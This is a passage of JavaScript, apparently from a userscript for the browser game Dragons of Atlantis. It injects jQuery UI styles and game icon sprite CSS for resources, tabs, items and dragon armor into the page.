	.ui-icon-circle-zoomin { background-position: -176px -192px; }\
	.ui-icon-circle-zoomout { background-position: -192px -192px; }\
	.ui-icon-circlesmall-close { background-position: -32px -208px; }\
	.ui-icon-circlesmall-minus { background-position: -16px -208px; }\
	.ui-icon-circlesmall-plus { background-position: 0 -208px; }\
	.ui-icon-clipboard { background-position: -160px -128px; }\
	.ui-icon-clock { background-position: -80px -112px; }\
	.ui-icon-close { background-position: -80px -128px; }\
	.ui-icon-closethick { background-position: -96px -128px; }\
	.ui-icon-comment { background-position: -128px -96px; }\
	.ui-icon-contact { background-position: -192px -128px; }\
	.ui-icon-copy { background-position: -176px -128px; }\
	.ui-icon-disk { background-position: -96px -112px; }\
	.ui-icon-document { background-position: -32px -96px; }\
	.ui-icon-document-b { background-position: -48px -96px; }\
	.ui-icon-eject { background-position: -112px -160px; }\
	.ui-icon-extlink { background-position: -32px -80px; }\
	.ui-icon-flag { background-position: -16px -112px; }\
	.ui-icon-folder-collapsed { background-position: 0 -96px; }\
	.ui-icon-folder-open { background-position: -16px -96px; }\
	.ui-icon-gear { background-position: -192px -112px; }\
	.ui-icon-grip-diagonal-se { background-position: -80px -224px; }\
	.ui-icon-grip-dotted-horizontal { background-position: -16px -224px; }\
	.ui-icon-grip-dotted-vertical { background-position: 0 -224px; }\
	.ui-icon-grip-solid-horizontal { background-position: -48px -224px; }\
	.ui-icon-grip-solid-vertical { background-position: -32px -224px; }\
	.ui-icon-gripsmall-diagonal-se { background-position: -64px -224px; }\
	.ui-icon-heart { background-position: -208px -112px; }\
	.ui-icon-help { background-position: -48px -144px; }\
	.ui-icon-home { background-position: 0 -112px; }\
	.ui-icon-image { background-position: -208px -128px; }\
	.ui-icon-info { background-position: -16px -144px; }\
	.ui-icon-key { background-position: -112px -128px; }\
	.ui-icon-lightbulb { background-position: -128px -128px; }\
	.ui-icon-link { background-position: -240px -112px; }\
	.ui-icon-locked { background-position: -192px -96px; }\
	.ui-icon-mail-closed { background-position: -80px -96px; }\
	.ui-icon-mail-open { background-position: -96px -96px; }\
	.ui-icon-minus { background-position: -48px -128px; }\
	.ui-icon-minusthick { background-position: -64px -128px; }\
	.ui-icon-newwin { background-position: -48px -80px; }\
	.ui-icon-note { background-position: -64px -96px; }\
	.ui-icon-notice { background-position: -32px -144px; }\
	.ui-icon-pause { background-position: -16px -160px; }\
	.ui-icon-pencil { background-position: -64px -112px; }\
	.ui-icon-person { background-position: -144px -96px; }\
	.ui-icon-pin-s { background-position: -144px -144px; }\
	.ui-icon-pin-w { background-position: -128px -144px; }\
	.ui-icon-play { background-position: 0 -160px; }\
	.ui-icon-plus { background-position: -16px -128px; }\
	.ui-icon-plusthick { background-position: -32px -128px; }\
	.ui-icon-power { background-position: 0 -176px; }\
	.ui-icon-print { background-position: -160px -96px; }\
	.ui-icon-radio-off { background-position: -96px -144px; }\
	.ui-icon-radio-on { background-position: -112px -144px; }\
	.ui-icon-refresh { background-position: -64px -80px; }\
	.ui-icon-scissors { background-position: -144px -128px; }\
	.ui-icon-script { background-position: -240px -128px; }\
	.ui-icon-search { background-position: -160px -112px; }\
	.ui-icon-seek-end { background-position: -64px -160px; }\
	.ui-icon-seek-first { background-position: -80px -160px; }\
	.ui-icon-seek-next { background-position: -32px -160px; }\
	.ui-icon-seek-prev { background-position: -48px -160px; }\
	.ui-icon-seek-start { background-position: -80px -160px; }\
	.ui-icon-shuffle { background-position: -80px -80px; }\
	.ui-icon-signal { background-position: -32px -176px; }\
	.ui-icon-signal-diag { background-position: -16px -176px; }\
	.ui-icon-squaresmall-close { background-position: -80px -208px; }\
	.ui-icon-squaresmall-minus { background-position: -64px -208px; }\
	.ui-icon-squaresmall-plus { background-position: -48px -208px; }\
	.ui-icon-star { background-position: -224px -112px; }\
	.ui-icon-stop { background-position: -96px -160px; }\
	.ui-icon-suitcase { background-position: -112px -96px; }\
	.ui-icon-tag { background-position: -240px -96px; }\
	.ui-icon-transfer-e-w { background-position: -96px -80px; }\
	.ui-icon-transferthick-e-w { background-position: -112px -80px; }\
	.ui-icon-trash { background-position: -176px -96px; }\
	.ui-icon-triangle-1-e { background-position: -32px -16px; }\
	.ui-icon-triangle-1-n { background-position: 0 -16px; }\
	.ui-icon-triangle-1-ne { background-position: -16px -16px; }\
	.ui-icon-triangle-1-nw { background-position: -112px -16px; }\
	.ui-icon-triangle-1-s { background-position: -64px -16px; }\
	.ui-icon-triangle-1-se { background-position: -48px -16px; }\
	.ui-icon-triangle-1-sw { background-position: -80px -16px; }\
	.ui-icon-triangle-1-w { background-position: -96px -16px; }\
	.ui-icon-triangle-2-e-w { background-position: -144px -16px; }\
	.ui-icon-triangle-2-n-s { background-position: -128px -16px; }\
	.ui-icon-unlocked { background-position: -208px -96px; }\
	.ui-icon-video { background-position: -224px -128px; }\
	.ui-icon-volume-off { background-position: -128px -160px; }\
	.ui-icon-volume-on { background-position: -144px -160px; }\
	.ui-icon-wrench { background-position: -176px -112px; }\
	.ui-icon-zoomin { background-position: -128px -112px; }\
	.ui-icon-zoomout { background-position: -144px -112px; }\
	/* Corner radius */\
	.ui-corner-all, .ui-corner-top, .ui-corner-left, .ui-corner-tl {\
		-moz-border-radius-topleft: 4px;\
		-webkit-border-top-left-radius: 4px;\
		-khtml-border-top-left-radius: 4px;\
		border-top-left-radius: 4px;\
	}\
	.ui-corner-all, .ui-corner-top, .ui-corner-right, .ui-corner-tr {\
		-moz-border-radius-topright: 4px;\
		-webkit-border-top-right-radius: 4px;\
		-khtml-border-top-right-radius: 4px;\
		border-top-right-radius: 4px;\
	}\
	.ui-corner-all, .ui-corner-bottom, .ui-corner-left, .ui-corner-bl {\
		-moz-border-radius-bottomleft: 4px;\
		-webkit-border-bottom-left-radius: 4px;\
		-khtml-border-bottom-left-radius: 4px;\
		border-bottom-left-radius: 4px;\
	}\
	.ui-corner-all, .ui-corner-bottom, .ui-corner-right, .ui-corner-br {\
		-moz-border-radius-bottomright: 4px;\
		-webkit-border-bottom-right-radius: 4px;\
		-khtml-border-bottom-right-radius: 4px;\
		border-bottom-right-radius: 4px;\
	}\
	/* Overlays */\
	.ui-widget-overlay\
	{\
		opacity: .50;\
		filter:Alpha(Opacity=50);\
	}\
	.ui-widget-shadow\
	{\
		margin: -5px 0 0 -5px;\
		padding: 5px;\
		opacity: .20;\
		filter:Alpha(Opacity=20);\
		-moz-border-radius: 5px;\
		-khtml-border-radius: 5px;\
		-webkit-border-radius: 5px;\
		border-radius: 5px;\
	}\
	/* TeamWork_jQuery UI Resizable 1.8.16 */\
	.ui-resizable\
	{\
		position: relative;\
	}\
	.ui-resizable-handle\
	{\
		position: absolute;\
		font-size: 0.1px;\
		z-index: 99999;\
		display: block;\
	}\
	.ui-resizable-disabled .ui-resizable-handle,\
	.ui-resizable-autohide .ui-resizable-handle\
	{\
		display: none;\
	}\
	.ui-resizable-n\
	{\
		cursor: n-resize;\
		height: 7px;\
		width: 100%;\
		top: -5px;\
		left: 0;\
	}\
	.ui-resizable-s\
	{\
		cursor: s-resize;\
		height: 7px;\
		width: 100%;\
		bottom: -5px;\
		left: 0;\
	}\
	.ui-resizable-e\
	{\
		cursor: e-resize;\
		width: 7px;\
		right: -5px;\
		top: 0;\
		height: 100%;\
	}\
	.ui-resizable-w\
	{\
		cursor: w-resize;\
		width: 7px;\
		left: -5px;\
		top: 0;\
		height: 100%;\
	}\
	.ui-resizable-se\
	{\
		cursor: se-resize;\
		width: 12px;\
		height: 12px;\
		right: 1px;\
		bottom: 1px;\
	}\
	.ui-resizable-sw\
	{\
		cursor: sw-resize;\
		width: 9px;\
		height: 9px;\
		left: -5px;\
		bottom: -5px;\
	}\
	.ui-resizable-nw\
	{\
		cursor: nw-resize;\
		width: 9px;\
		height: 9px;\
		left: -5px;\
		top: -5px;\
	}\
	.ui-resizable-ne\
	{\
		cursor: ne-resize;\
		width: 9px;\
		height: 9px;\
		right: -5px;\
		top: -5px;\
	}\
	/* TeamWork_jQuery UI Selectable 1.8.16 */\
	.ui-selectable-helper\
	{\
		position: absolute;\
		z-index: 100;\
		border:1px dotted #000;\
	}\
	/* TeamWork_jQuery UI Accordion 1.8.16 */\
	.ui-accordion\
	{\
		width: 100%;\
	}\
	.ui-accordion .ui-accordion-header\
	{\
		cursor: pointer;\
		position: relative;\
		margin-top: 1px;\
		zoom: 1;\
	}\
	.ui-accordion .ui-accordion-li-fix {\
		display: inline;\
	}\
	.ui-accordion .ui-accordion-header-active\
	{\
		border-bottom: 0 !important;\
	}\
	.ui-accordion .ui-accordion-header a\
	{\
		display: block;\
		width:100%;\
		font-size: 0.9em;\
		padding: .2em .3em .2em .3em;\
	}\
	.ui-accordion-icons .ui-accordion-header a\
	{\
		padding-left: 2em;\
	}\
	.ui-accordion .ui-accordion-header .ui-icon\
	{\
		position: absolute;\
		left: .5em;\
		top: 50%;\
		margin-top: -8px;\
	}\
	.ui-accordion .ui-accordion-content\
	{\
		padding: .5em .5em;\
		border-top: 0;\
		margin-top: -2px;\
		position: relative;\
		top: 1px;\
		margin-bottom: 2px;\
		overflow: auto;\
		display: none;\
		zoom: 1;\
	}\
	.ui-accordion .ui-accordion-content-active\
	{\
		display: block;\
	}\
	/* TeamWork_jQuery UI Autocomplete 1.8.16 */\
	.ui-autocomplete\
	{\
		position: absolute;\
		cursor: default;\
	}\
	/* TeamWork_jQuery UI Menu 1.8.16 */\
	.ui-menu\
	{\
		list-style:none;\
		padding: 2px;\
		margin: 0;\
		display:block;\
		float: left;\
	}\
	.ui-menu .ui-menu\
	{\
		margin-top: -3px;\
	}\
	.ui-menu .ui-menu-item\
	{\
		margin:0;\
		padding: 0;\
		zoom: 1;\
		float: left;\
		clear: left;\
		width: 100%;\
	}\
	.ui-menu .ui-menu-item a\
	{\
		text-decoration:none;\
		display:block;\
		padding:.2em .4em;\
		line-height:1.2em;\
		zoom:1;\
	}\
	.ui-menu .ui-menu-item a.ui-state-hover,\
	.ui-menu .ui-menu-item a.ui-state-active\
	{\
		font-weight: normal;\
		margin: -1px;\
	}\
	/* TeamWork_jQuery UI Button 1.8.16 */\
	.ui-button\
	{\
		display: inline-block;\
		position: relative;\
		padding: 0;\
		margin-right: .1em;\
		text-decoration: none !important;\
		cursor: pointer;\
		text-align: center;\
		zoom: 1;\
		overflow: visible;\
	}\
	/* the overflow property removes extra width in IE */\
	.ui-button-icon-only\
	{\
		width: 2.2em;\
	}\
	/* to make room for the icon, a width needs to be set here */\
	button.ui-button-icon-only\
	{\
		width: 2.4em;\
	}\
	/* button elements seem to need a little more width */\
	.ui-button-icons-only\
	{\
		width: 3.4em;\
	}\
	button.ui-button-icons-only\
	{\
		width: 3.7em;\
	}\
	/*button text element */\
	.ui-button .ui-button-text\
	{\
		display: block;\
		line-height: 1.2em;\
	}\
	.ui-button-text-only .ui-button-text\
	{\
		padding: .4em 1em;\
	}\
	.ui-button-icon-only .ui-button-text,\
	.ui-button-icons-only .ui-button-text\
	{\
		padding: .4em;\
		text-indent: -9999999px;\
	}\
	.ui-button-text-icon-primary .ui-button-text,\
	.ui-button-text-icons .ui-button-text\
	{\
		padding: .4em 1em .4em 2.1em;\
	}\
	.ui-button-text-icon-secondary .ui-button-text,\
	.ui-button-text-icons .ui-button-text\
	{\
		padding: .4em 2.1em .4em 1em;\
	}\
	.ui-button-text-icons .ui-button-text\
	{\
		padding-left: 2.1em;\
		padding-right: 2.1em;\
	}\
	/* no icon support for input elements, provide padding by default */\
	input.ui-button\
	{\
		padding: .4em 1em;\
	}\
	/*button icon element(s) */\
	.ui-button-icon-only .ui-icon,\
	.ui-button-text-icon-primary .ui-icon,\
	.ui-button-text-icon-secondary .ui-icon,\
	.ui-button-text-icons .ui-icon,\
	.ui-button-icons-only .ui-icon\
	{\
		position: absolute;\
		top: 50%;\
		margin-top: -8px;\
	}\
	.ui-button-icon-only .ui-icon {\
		left: 50%;\
		margin-left: -8px;\
	}\
	.ui-button-text-icon-primary .ui-button-icon-primary,\
	.ui-button-text-icons .ui-button-icon-primary,\
	.ui-button-icons-only .ui-button-icon-primary\
	{\
		left: .5em;\
	}\
	.ui-button-text-icon-secondary .ui-button-icon-secondary,\
	.ui-button-text-icons .ui-button-icon-secondary,\
	.ui-button-icons-only .ui-button-icon-secondary\
	{\
		right: .5em;\
	}\
	.ui-button-text-icons .ui-button-icon-secondary,\
	.ui-button-icons-only .ui-button-icon-secondary\
	{\
		right: .5em;\
	}\
	/*button sets*/\
	.ui-buttonset\
	{\
		margin-right: 7px;\
	}\
	.ui-buttonset .ui-button\
	{\
		margin-left: 0;\
		margin-right: -.3em;\
	}\
	/* workarounds */\
	/* reset extra padding in Firefox */\
	button.ui-button::-moz-focus-inner\
	{\
		border: 0;\
		padding: 0;\
	}\
	/* TeamWork_jQuery UI Dialog 1.8.16  */\
	.ui-dialog {\
		position	: absolute;\
		padding		: .2em;\
		width		: 300px;\
		overflow	: hidden;\
		-webkit-box-shadow	: rgba(0,0,0,0.8) 0 0 10px;\
		-moz-box-shadow		: rgba(0,0,0,0.8) 0 0 10px;\
		-khtml-box-shadow	: rgba(0,0,0,0.8) 0 0 10px;\
		box-shadow			: rgba(0,0,0,0.8) 0 0 10px;\
	}\
	.ui-dialog .ui-dialog-titlebar {\
		padding		: .4em 1em;\
		position	: relative;\
	}\
	.ui-dialog .ui-dialog-title {\
		float				: left;\
		margin				: .1em 16px .1em 0;\
		font-weight			: bold;\
		text-shadow			: 0.1em 0.1em rgba(0,0,0,0.6);\
		-moz-text-shadow	: 0.1em 0.1em rgba(0,0,0,0.6);\
		-webkit-text-shadow	: 0.1em 0.1em rgba(0,0,0,0.6);\
		-khtml-text-shadow	: 0.1em 0.1em rgba(0,0,0,0.6);\
	} \
	.ui-dialog .ui-dialog-titlebar-close {\
		position	: absolute;\
		right		: .3em;\
		top			: 50%;\
		width		: 17px;\
		margin		: -10px 0 0 0; \
		padding		: 1px;\
		height		: 16px;\
	}\
	.ui-dialog .ui-dialog-titlebar-close span {\
		display		: block;\
	}\
	.ui-dialog .ui-dialog-content {\
		position	: relative;\
		border		: 0;\
		padding		: .5em 1em;\
		background	: none;\
		overflow	: auto;\
		zoom		: 1;\
	}\
	.ui-dialog .ui-dialog-buttonpane {\
		text-align	: left;\
		border-width: 1px 0 0 0;\
		margin		: .5em 0 0 0;\
		padding		: .3em 1em .5em .4em;\
		background-image: none;\
	}\
	.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset\
	{\
		float		: right;\
	}\
	.ui-dialog .ui-dialog-buttonpane button {\
		margin		: .5em .4em .5em 0;\
		cursor		: pointer;\
	}\
	.ui-dialog .ui-resizable-se {\
		width		: 14px;\
		height		: 14px;\
		right		: 3px;\
		bottom		: 3px;\
	}\
	.ui-draggable .ui-dialog-titlebar\
	{\
		cursor		: move;\
	}\
	/* TeamWork_jQuery UI Slider 1.8.16 */\
	.ui-slider\
	{\
		position: relative;\
		text-align: left;\
	}\
	.ui-slider .ui-slider-handle\
	{\
		position: absolute;\
		z-index: 2;\
		width: 1.2em;\
		height: 1.2em;\
		cursor: default;\
	}\
	.ui-slider .ui-slider-range\
	{\
		position: absolute;\
		z-index: 1;\
		font-size: .7em;\
		display: block;\
		border: 0;\
		background-position: 0 0;\
	}\
	.ui-slider-horizontal\
	{\
		height: .8em;\
	}\
	.ui-slider-horizontal .ui-slider-handle\
	{\
		top: -.3em;\
		margin-left: -.6em;\
	}\
	.ui-slider-horizontal .ui-slider-range\
	{\
		top: 0;\
		height: 100%;\
	}\
	.ui-slider-horizontal .ui-slider-range-min\
	{\
		left: 0;\
	}\
	.ui-slider-horizontal .ui-slider-range-max\
	{\
		right: 0;\
	}\
	.ui-slider-vertical\
	{\
		width: .8em;\
		height: 100px;\
	}\
	.ui-slider-vertical .ui-slider-handle\
	{\
		left: -.3em;\
		margin-left: 0;\
		margin-bottom: -.6em;\
	}\
	.ui-slider-vertical .ui-slider-range\
	{\
		left: 0;\
		width: 100%;\
	}\
	.ui-slider-vertical .ui-slider-range-min\
	{\
		bottom: 0;\
	}\
	.ui-slider-vertical .ui-slider-range-max\
	{\
		top: 0;\
	}\
	/* TeamWork_jQuery UI Tabs 1.8.16 */\
	.ui-tabs\
	{\
		position: relative;\
		padding: .2em;\
		zoom: 1;\
	}\
	.ui-tabs .ui-tabs-nav\
	{\
		margin: 0;\
		padding: .2em .2em 0;\
	}\
	.ui-tabs .ui-tabs-nav li\
	{\
		list-style: none;\
		float: left;\
		position: relative;\
		top: 1px;\
		margin: 0 .2em 1px 0;\
		border-bottom: 0 !important;\
		padding: 0;\
		white-space: nowrap;\
	}\
	.ui-tabs .ui-tabs-nav li a\
	{\
		float: left;\
		padding: .5em 1em;\
		text-decoration: none;\
	}\
	.ui-tabs .ui-tabs-nav li.ui-tabs-selected\
	{\
		margin-bottom: 0;\
		padding-bottom: 1px;\
	}\
	.ui-tabs .ui-tabs-nav li.ui-tabs-selected a,\
	.ui-tabs .ui-tabs-nav li.ui-state-disabled a,\
	.ui-tabs .ui-tabs-nav li.ui-state-processing a\
	{\
		cursor: text;\
	}\
	.ui-tabs .ui-tabs-nav li a,\
	.ui-tabs.ui-tabs-collapsible .ui-tabs-nav li.ui-tabs-selected a\
	{\
		cursor: pointer;\
	}\
	/* first selector in group seems obsolete, but required to overcome bug in Opera\
	   applying cursor: text overall if defined elsewhere... */\
	.ui-tabs .ui-tabs-panel\
	{\
		display: block;\
		border-width: 0;\
		padding: 1em 1.4em;\
		background: none;\
	}\
	.ui-tabs .ui-tabs-hide\
	{\
		display: none !important;\
	}\
	/* TeamWork_jQuery UI Progressbar 1.8.16 */\
	.ui-progressbar\
	{\
		height:2em;\
		text-align: left;\
	}\
	.ui-progressbar .ui-progressbar-value\
	{\
		margin: -1px;\
		height:100%;\
	}\
	/* 3D Fx */\
	.ui-widget-content\
	{\
		background-image : linear-gradient(bottom, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);\
		background-image : -moz-linear-gradient(bottom, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);\
		background-image : -webkit-linear-gradient(bottom, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);\
		background-image : -khtml-linear-gradient(bottom, rgba(255,255,255,0.1) 1%,  rgba(255,255,255,0.8) 99%);\
	}\
	.ui-progressbar\
	{\
		background-image : linear-gradient(top, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);\
		background-image : -moz-linear-gradient(top, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);\
		background-image : -webkit-linear-gradient(top, rgba(255,255,255,0.1) 1%, rgba(255,255,255,0.8) 99%);\
		background-image : -khtml-linear-gradient(top, rgba(255,255,255,0.1) 1%,  rgba(255,255,255,0.8) 99%);\
		-webkit-box-shadow:0 0 1px rgba(0,0,0,0.7);\
		-moz-box-shadow: 0 0 1px rgba(0,0,0,0.7);\
		box-shadow:0 0 1px rgba(0,0,0,0.7);\
	}\
	.ui-widget-header,\
	.ui-widget-header .ui-state-focus,\
	.ui-widget-header .ui-state-active,\
	.ui-widget-header .ui-state-highlight,\
	.ui-state-hover,\
	.ui-widget-content .ui-state-hover,\
	.ui-widget-header .ui-state-hover\
	{\
		-webkit-box-shadow:0 0 15px rgba(255,255,255,0.8) inset, 1px 1px 1px rgba(255,255,255,0.8) inset, -1px -1px 1px rgba(255,255,255,0.8) inset;\
		-moz-box-shadow: 0 0 15px rgba(255,255,255,0.8) inset, 1px 1px 1px rgba(255,255,255,0.8) inset, -1px -1px 1px rgba(255,255,255,0.8) inset;\
		box-shadow:0 0 15px rgba(255,255,255,0.8) inset, 1px 1px 1px rgba(255,255,255,0.8) inset, -1px -1px 1px rgba(255,255,255,0.8) inset;\
	}\
	#jquery-msg-bg {\
	  -moz-opacity: 0.6;\
	  -khtml-opacity: 0.6;\
	  opacity: 0.6;\
	  filter: alpha(opacity=60);\
	  background: #000;\
	}\
	.jquery-msg-content {\
	  -webkit-background-clip: padding-box;\
	  padding: 15px;\
	  font-size: 11pt;\
	}\
	.black-on-white .jquery-msg-content {\
	  background: #FFE;\
	  color: #333333;\
	  -moz-opacity: 0.9;\
	  -khtml-opacity: 0.9;\
	  opacity: 0.9;\
	  filter: alpha(opacity=90);\
	  -webkit-box-shadow: 5px 5px 30px 0 #000;\
	  -moz-box-shadow: 5px 5px 30px 0 #000;\
	  box-shadow: 5px 5px 30px 0 #000;\
	  -webkit-border-radius: 8px;\
	  -moz-border-radius: 8px;\
	  -o-border-radius: 8px;\
	  -khtml-border-radius: 8px;\
	  -ms-border-radius: 8px;\
	  border-radius: 8px;\
	}\
	.white-on-black .jquery-msg-content {\
	  -moz-opacity: 0.5;\
	  -khtml-opacity: 0.5;\
	  opacity: 0.5;\
	  filter: alpha(opacity=50);\
	  background: #000;\
	  color: #FFE;\
	  -webkit-border-radius: 8px;\
	  -moz-border-radius: 8px;\
	  -o-border-radius: 8px;\
	  -khtml-border-radius: 8px;\
	  -ms-border-radius: 8px;\
	  border-radius: 8px;\
	}\
	').appendTo( 'head' );

	
/** Add CSS Styles 
******************************/

$J("<style>").append('\
	.' + UID['doa-icons'] + ' {\
		display:inline-block;\
		width: 26px;\
		height: 15px;\
		margin:0;\
		padding:0;\
		background-position: 26px 26px;\
		background-image: url(https://wackoscripts.com/icons.png)\
	}\
	/****  Resources  ****/\
	.i-population {\
		background-position:    0px   0px;\
	}\
	.i-life {\
		background-position:  -26px   0px;\
	}\
	.i-tax {\
		background-position:  -52px   0px;\
	}\
	.i-rubie {\
		background-position:  -78px   0px;\
	}\
	.i-gold {\
		background-position: -104px   0px;\
	}\
	.i-food {\
		background-position: -130px   0px;\
	}\
	.i-wood {\
		background-position: -156px   0px;\
	}\
	.i-ore {\
		background-position: -182px   0px;\
	}\
	.i-stone {\
		background-position: -208px   0px;\
	}\
	.i-blue_energy {\
		background-position: -235px   0px;\
	}\
	.i-AnthropusTalisman {\
		background-position: -260px   0px;\
	}\
	.i-resurrect {\
		background-position: -287px   0px;\
	}\
	/****  Tabs  ****/\
	.i-Info {\
		background-position: -573px -119px;\
	}\
	.i-Tasks, .i-Jobs {\
		background-position: -573px -136px;\
	}\
	.i-Building {\
		background-position: -573px -153px;\
	}\
	.i-Research {\
		background-position: -573px -170px;\
	}\
	.i-Training {\
		background-position: -573px -187px;\
	}\
	.i-Waves, .i-Wave {\
		background-position: -573px -204px;\
	}\
	.i-Attacks, .i-AttackMarch {\
		background-position: -573px -221px;\
	}\
	.i-Spying, .i-SpyMarch {\
		background-position: -573px -238px;\
	}\
	.i-Unknown {\
		background-position: -547px -290px;\
	}\
	.i-Reinforcement {\
		background-position: -573px -255px;\
	}\
	.i-Alliance {\
		background-position: -573px -273px;\
	}\
	.i-Sentinel {\
		background-position: -573px -289px;\
	}\
	.i-Map {\
		background-position: -573px -306px;\
	}\
	.i-Logs {\
		background-position: -573px -323px;\
	}\
	.i-Summary {\
		background-position: -573px -340px;\
	}\
	.i-Options, .i-Default {\
		background-position: -573px -397px;\
	}\
	/****  Status  ****/\
	.i-done {\
		background-position: -547px -119px;\
	}\
	.i-cancel, .i-stop {\
		background-position: -547px -136px;\
	}\
	.i-marching, .i-play {\
		background-position: -547px -153px;\
	}\
	.i-retreating {\
		background-position: -547px -170px;\
	}\
	.i-encamped {\
		background-position: -547px -187px;\
	}\
	.i-Members {\
		background-position: -547px -202px;\
	}\
	.i-Alliances {\
		background-position: -547px -220px;\
	}\
	.i-Activity {\
		background-position: -547px -238px;\
	}\
	.i-Show {\
		background-position: -547px -255px;\
	}\
	.i-Hide {\
		background-position: -547px -273px;\
	}\
	/********** Items SpeedUps  *********/\
	.i-Blink {\
		background-position:    0px -17px;\
	}\
	.i-Hop {\
		background-position:  -26px -17px;\
	}\
	.i-Skip {\
		background-position:  -52px -17px;\
	}\
	.i-Jump {\
		background-position:  -78px -17px;\
	}\
	.i-Leap {\
		background-position:  -104px -17px;\
	}\
	.i-Bounce {\
		background-position: -130px -17px;\
	}\
	.i-Bore {\
		background-position: -156px -17px;\
	}\
	.i-Bolt {\
		background-position: -182px -17px;\
	}\
	.i-Blast {\
		background-position: -209px -17px;\
	}\
	.i-ForcedMarchDrops {\
		background-position: -261px -17px;\
	}\
	.i-TranceMarchDrops {\
		background-position: -288px -17px;\
	}\
	.i-TestroniusPowder {\
		background-position: -316px -17px;\
	}\
	.i-TestroniusInfusion {\
		background-position: -341px -17px;\
	}\
	.i-DoubleTaxDayDeclaration {\
		background-position:  -78px -51px;\
	}\
	.i-DoubleTaxWeekDeclaration {\
		background-position: -104px -51px;\
	}\
	/********** Items Production  *********/\
	.i-AtlagenHarvestNanosDay {\
		background-position:    0px -35px;\
	}\
	.i-AtlagenHarvestNanosWeek {\
		background-position:  -26px -35px;\
	}\
	.i-DryadForestNanosDay {\
		background-position:  -52px -35px;\
	}\
	.i-DryadForestNanosWeek {\
		background-position:  -78px -35px;\
	}\
	.i-OreadStoneNanosDay {\
		background-position: -104px -35px;\
	}\
	.i-OreadStoneNanosWeek {\
		background-position: -130px -35px;\
	}\
	.i-EpeoradMetalsNanosDay {\
		background-position: -156px -35px;\
	}\
	.i-EpeoradMetalsNanosWeek {\
		background-position: -182px -35px;\
	}\
	.i-NanoCollectorDay {\
		background-position: -209px -35px;\
	}\
	.i-NanoCollectorWeek {\
		background-position: -235px -35px;\
	}\
	.i-NanoCanisters {\
		background-position: -261px -35px;\
	}\
	.i-NanoCrates {\
		background-position: -287px -35px;\
	}\
	/***********  Items Chest  **********/\
	.i-HarvestCornu,\
	.i-HarvestCornuCopia {\
		background-position:    0px -52px;\
	}\
	.i-CompletionGrantPortfolio {\
		background-position:  -26px -52px;\
	}\
	.i-TimeTrickstersBag {\
		background-position:  -52px -52px;\
	}\
	.i-ChestOfCompassion {\
		background-position:    0px -69px;\
	}\
	.i-ExpansionChest {\
		background-position:  -26px -69px;\
	}\
	.i-ChestOfardor {\
		background-position:  -52px -69px;\
	}\
	.i-HoldandWarpChest {\
		background-position:  -78px -69px;\
	}\
	.i-YuletideChest {\
		background-position: -104px -69px;\
	}\
	.i-RESERVED_SLOT_GreatDragonEggChest {\
		background-position:    0px -86px;\
	}\
	.i-GreatDragonChest {\
		background-position:  -26px -86px;\
	}\
	.i-RESERVED_SLOT_WaterDragonEggChest {\
		background-position:  -52px -86px;\
	}\
	.i-WaterDragonChest {\
		background-position:  -78px -86px;\
	}\
	.i-RESERVED_SLOT_WaterDragonArk {\
		background-position: -104px -86px;\
	}\
	.i-StoneEggChest {\
		background-position: -130px -86px;\
	}\
	.i-StoneDragonChest {\
		background-position: -156px -86px;\
	}\
	.i-StoneDragonArk,\
	.i-StoneArk {\
		background-position: -182px -86px;\
	}\
	.i-FireDragonEggChest {\
		background-position: -209px -86px;\
	}\
	.i-FireDragonChest {\
		background-position: -235px -86px;\
	}\
	.i-FireDragonArk {\
		background-position: -261px -86px;\
	}\
	.i-WindDragonEggChest {\
		background-position: -287px -86px;\
	}\
	.i-WindDragonChest {\
		background-position: -313px -86px;\
	}\
	.i-WindDragonArk {\
		background-position: -339px -86px;\
	}\
	.i-SpectralEggChest {\
		background-position: -365px -86px;\
	}\
	.i-SpectralChest {\
		background-position: -391px -86px;\
	}\
	.i-SpectralArk {\
		background-position: -417px -86px;\
	}\
	/************ Items Armor  ***********/\
	.i-GreatDragonHelmet {\
		background-position:    0px -137px;\
	}\
	.i-GreatDragonClawGuards {\
		background-position:  -26px -137px;\
	}\
	.i-GreatDragonBodyArmor {\
		background-position:  -52px -137px;\
	}\
	.i-GreatDragonTailGuard {\
		background-position:  -78px -137px;\
	}\
	.i-WaterDragonHelmet {\
		background-position:    0px -154px;\
	}\
	.i-WaterDragonClawGuards {\
		background-position:  -26px -154px;\
	}\
	.i-WaterDragonBodyArmor {\
		background-position:  -52px -154px;\
	}\
	.i-WaterDragonTailGuard {\
		background-position:  -78px -154px;\
	}\
	.i-StoneDragonHelmet {\
		background-position:    0px -171px;\
	}\
	.i-StoneDragonClawGuards {\
		background-position:  -26px -171px;\
	}\
	.i-StoneDragonBodyArmor {\
		background-position:  -52px -171px;\
	}\
	.i-StoneDragonTailGuard {\
		background-position:  -78px -171px;\
	}\
	.i-FireDragonHelmet {\
		background-position:    0px -188px;\
	}\
	.i-FireDragonClawGuards {\
		background-position:  -26px -188px;\
	}\
	.i-FireDragonBodyArmor {\
		background-position:  -52px -188px;\
	}\
	.i-FireDragonTailGuard {\
		background-position:  -78px -188px;\
	}\
	.i-WindDragonHelmet {\
		background-position:    0px -205px;\
	}\
	.i-WindDragonClawGuards {\
		background-position:  -26px -205px;\
	}\
	.i-WindDragonBodyArmor {\
		background-position:  -52px -205px;\
	}\
	.i-WindDragonTailGuard {\
		background-position:  -78px -205px;\
	}\
	.i-SpectralDragonHead, .i-SpectralDragonHelmet {\
		background-position:    0px -222px;\
	}\
	.i-SpectralDragonTalons, .i-SpectralDragonClawGuards {\
		background-position:  -26px -222px;\
	}\
	.i-SpectralDragonBody, .i-SpectralDragonBodyArmor {\
		background-position:  -52px -222px;\
	}\
	.i-SpectralDragonTail, .i-SpectralDragonTailGuard {\
		background-position:  -78px -222px;\
	}\
	.i-IceDragonHelmet {\
		background-position:    0px -238px;\
	}\
	.i-IceDragonClawGuards {\
		background-position:  -26px -238px;\
	}\
	.i-IceDragonBodyArmor {\
		background-position:  -52px -238px;\
	}\
	.i-IceDragonTailGuard {\
		background-position:  -78px -238px;\
	}\
	.i-SwampDragonHelmet {\
		background-position:    0px -254px;\
	}\
	.i-SwampDragonClawGuards {\
		background-position:  -26px -254px;\
	}\
	.i-SwampDragonBodyArmor {\
		background-position:  -52px -254px;\
	}\
	.i-SwampDragonTailGuard {\
